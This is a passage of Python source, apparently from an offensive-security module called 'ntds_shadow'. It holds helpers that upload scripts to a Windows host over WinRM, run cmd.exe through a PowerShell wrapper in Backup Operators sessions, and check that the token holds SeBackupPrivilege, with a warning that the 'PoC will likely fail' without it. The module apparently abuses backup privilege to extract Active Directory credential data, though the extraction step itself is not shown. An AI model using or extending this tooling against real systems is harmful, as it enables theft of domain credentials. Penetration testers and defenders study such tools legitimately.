                    context.log.debug("Staging dir removed")
            except Exception as exc:
                context.log.fail(f"Staging dir verification failed: {exc!r}")
                state.cleanup_had_failure = True


# File upload helper
def _upload_script(conn, content: str, remote_path: str) -> None:
    """
    Write ASCII/CRLF script content to a local temp file and upload via copy().

    Uses mkstemp so the fd is closed before copy() reads the file,
    avoiding Windows file-lock issues.
    """
    fd, local_path = tempfile.mkstemp(suffix=".txt")
    try:
        with os.fdopen(fd, "wb") as fh:
            fh.write(content.encode("ascii"))
        conn.copy(local_path, remote_path)
    finally:
        with suppress(OSError):
            os.unlink(local_path)


# Native-command adapter
def _run_cmd(conn, command: str) -> tuple[str, str, int]:
    """
    Execute a native Windows command through the PowerShell WinRM endpoint.

    Direct execute_cmd raises WSManFaultError code 5 for Backup Operators
    sessions on this WinRM listener.  This adapter spawns cmd.exe /c <command>
    via System.Diagnostics.ProcessStartInfo inside a PowerShell snippet,
    capturing stdout, stderr and the native exit code in separate streams.

    Both streams are read asynchronously before WaitForExit() to avoid
    pipe-buffer deadlocks regardless of output volume.  $ErrorActionPreference
    = 'Stop' and a try/catch block ensure that PowerShell or process-launch
    failures propagate as had_errors rather than silently returning rc=0.

    Returns (stdout, stderr, returncode).
    Raises RuntimeError if had_errors is True or the result cannot be decoded.
    """
    # Escape single-quotes for the PowerShell single-quoted string literal.
    # All command strings are internally generated; no user-controlled input.
    esc = command.replace("'", "''")
    ps = (
        "$ErrorActionPreference = 'Stop'\n"
        "try {\n"
        "    $psi = New-Object System.Diagnostics.ProcessStartInfo\n"
        "    $psi.FileName = 'cmd.exe'\n"
        f"    $psi.Arguments = '/c {esc}'\n"
        "    $psi.RedirectStandardOutput = $true\n"
        "    $psi.RedirectStandardError  = $true\n"
        "    $psi.UseShellExecute = $false\n"
        "    $psi.CreateNoWindow  = $true\n"
        "    $p = [System.Diagnostics.Process]::Start($psi)\n"
        "    $soTask = $p.StandardOutput.ReadToEndAsync()\n"
        "    $seTask = $p.StandardError.ReadToEndAsync()\n"
        "    $p.WaitForExit()\n"
        "    [PSCustomObject]@{\n"
        "        Stdout   = $soTask.Result\n"
        "        Stderr   = $seTask.Result\n"
        "        ExitCode = $p.ExitCode\n"
        "    } | ConvertTo-Json -Compress\n"
        "} catch {\n"
        "    Write-Error $_\n"
        "}\n"
    )
    output, _streams, had_errors = conn.execute_ps(ps)
    if had_errors:
        raise RuntimeError("[ntds_shadow] _run_cmd: PowerShell transport error")
    if not output or not output.strip():
        raise RuntimeError(
            "[ntds_shadow] _run_cmd: empty output from PowerShell wrapper"
        )
    try:
        data = json.loads(output)
    except (json.JSONDecodeError, ValueError) as exc:
        raise RuntimeError(
            f"[ntds_shadow] _run_cmd: could not parse result JSON: {exc!r}"
        ) from exc
    if not isinstance(data, dict):
        raise RuntimeError(
            f"[ntds_shadow] _run_cmd: expected JSON object, got {type(data).__name__}"
        )
    for key in ("Stdout", "Stderr", "ExitCode"):
        if key not in data:
            raise RuntimeError(
                f"[ntds_shadow] _run_cmd: missing required key {key!r} in result"
            )
    if not isinstance(data["Stdout"], str):
        raise RuntimeError(
            "[ntds_shadow] _run_cmd: Stdout must be a string, "
            f"got {type(data['Stdout']).__name__}"
        )
    if not isinstance(data["Stderr"], str):
        raise RuntimeError(
            "[ntds_shadow] _run_cmd: Stderr must be a string, "
            f"got {type(data['Stderr']).__name__}"
        )
    # bool is a subclass of int in Python — reject it explicitly
    if isinstance(data["ExitCode"], bool) or not isinstance(data["ExitCode"], int):
        raise RuntimeError(
            "[ntds_shadow] _run_cmd: ExitCode must be an integer, "
            f"got {type(data['ExitCode']).__name__}"
        )
    return str(data["Stdout"]), str(data["Stderr"]), int(data["ExitCode"])


# Token-info helpers
_TARGET_PRIVS = {"SEBACKUPPRIVILEGE"}


def _log_priv_rows(context, stdout: str) -> bool:
    """Log relevant privileges and return whether SeBackupPrivilege is present."""
    found: set[str] = set()
    for line in stdout.splitlines():
        parts = [p.strip('"') for p in line.strip().split('","')]
        if not parts:
            continue
        priv = parts[0].upper()
        if priv in _TARGET_PRIVS:
            state_str = parts[2] if len(parts) > 2 else "unknown"
            context.log.debug(f"{parts[0]}: {state_str}")
            found.add(priv)

    if "SEBACKUPPRIVILEGE" not in found:
        context.log.fail("SeBackupPrivilege not found in token — PoC will likely fail")
        return False
    return True
